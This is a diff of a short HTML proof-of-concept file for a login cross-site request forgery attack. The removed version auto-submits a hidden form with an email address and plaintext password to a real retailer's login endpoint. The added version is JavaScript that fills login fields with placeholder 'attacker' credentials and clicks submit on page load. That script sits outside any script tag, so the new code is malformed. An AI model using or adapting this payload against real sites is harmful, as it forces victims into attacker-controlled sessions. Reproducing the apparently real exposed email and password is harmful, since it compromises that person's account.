@@ -1,14 +1,27 @@
-<!DOCTYPE html>
-<html lang="en">
-
+<html>
 <body>
-    <form id="csrfForm" action="https://boozt.com/login" method="POST">
-        <input type="hidden" name="email" value="iqbalup18@gmail.com">
-        <input type="hidden" name="password" value="6115Isayevm">
-    </form>
+    // Wait for the page to load fully
+window.onload = function() {
+    // Find the email and password fields
+    let emailField = document.querySelector('input[name="Email"]');
+    let passwordField = document.querySelector('input[name="Password"]');
     
-    <script>
-        document.getElementById("csrfForm").submit();
-    </script>
+    // Check if fields exist (avoid errors)
+    if (emailField && passwordField) {
+        // Enter the attacker's email and password
+        emailField.value = "attacker@example.com";
+        passwordField.value = "AttackerPassword123";
+
+        // Find and click the login button
+        let loginButton = document.querySelector('button[type="submit"]');
+        if (loginButton) {
+            loginButton.click();  // Automatically logs in
+        } else {
+            console.log("Login button not found.");
+        }
+    } else {
+        console.log("Login fields not found.");
+    }
+};
 </body>
 </html>
